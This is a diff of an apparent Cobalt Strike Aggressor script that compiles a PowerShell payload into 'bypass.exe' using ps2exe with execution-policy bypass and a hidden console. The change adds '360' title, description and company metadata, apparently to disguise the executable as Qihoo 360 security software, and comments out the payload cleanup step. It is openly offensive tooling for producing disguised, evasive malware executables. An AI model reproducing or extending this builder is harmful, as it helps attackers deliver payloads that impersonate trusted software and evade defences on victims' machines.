@@ -56,22 +56,23 @@ sub show {
 		prompt_file_save("bypass.exe", {
 			$output_exe = "$1";
 			if ($int_version == "4") {
-			$process = exec('powershell.exe -ExecutionPolicy bypass -command "'.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -noConsole -runtime40" ');
+				$process = exec('powershell.exe -ExecutionPolicy bypass -command "'.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -noConsole -runtime40 -title 360 -description 360 -company 360"');
+		
 		} else {
-			$process = exec('cmd.exe /c echo '.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -noConsole -runtime20 | powershell -');
+			$process = exec('cmd.exe /c echo '.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -noConsole -runtime20 -title 360 -description 360 -company 360 | powershell -ExecutionPolicy bypass');
 		}
 			@data = readAll($process);
 			println(@data);
 			closef($process);
 			if (-exists $output_exe) {
-				exec('cmd.exe /c del '.$payload_file_ps1);
+				#exec('cmd.exe /c del '.$payload_file_ps1);
 				show_message("\n输出exe地址：".$output_exe);
 			} else {
 				show_message('运行异常，请查看script console');
 			}
 		});
 	}else {
-		show_message('请指定binn文件和ico图标');
+		show_message('请指定bin文件和ico图标');
 	}
 
 }
